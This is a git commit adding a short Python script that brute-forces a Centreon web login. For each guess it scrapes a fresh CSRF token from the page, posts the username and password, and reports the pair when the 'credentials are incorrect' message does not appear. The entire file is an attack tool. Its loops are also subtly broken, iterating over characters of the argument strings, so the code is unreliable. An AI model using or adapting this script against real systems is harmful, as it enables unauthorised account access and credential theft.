5d76655e2e8e046a39f313d926c84848162c27ad
SecTheBit <46895441+SecTheBit@users.noreply.github.com>
2019-11-22 01:34:56 +0530

    Create csrf_brute_forcer.py

---
+++ csrf_brute_forcer.py
@@ -0,0 +1,25 @@
+import requests ,sys
+from lxml import html
+
+username=sys.argv[1]
+password=sys.argv[2]
+url_path=sys.argv[3]
+
+for usernames in username:
+   for each in password:
+         
+         req=requests.get(url_path)
+         tree=html.fromstring(req.text)
+         #change the name of csrf token and replace  it with "centreon_token" in below line
+         #change the name of the contents in "infp" variable
+         csrf_token=list(set(tree.xpath("//input[@name='centreon_token']/@value")))[0]
+         infp={'useralias':username,'password':each,'centreon_token':csrf_token,'submitLogin':'Connect'}
+         req_1=requests.post(url_path,data=infp)
+         if("Your credentials are incorrect."  not in req_1.text):
+                    print(username,each,csrf_token)
+                    break
+         
+    
+
+
+    
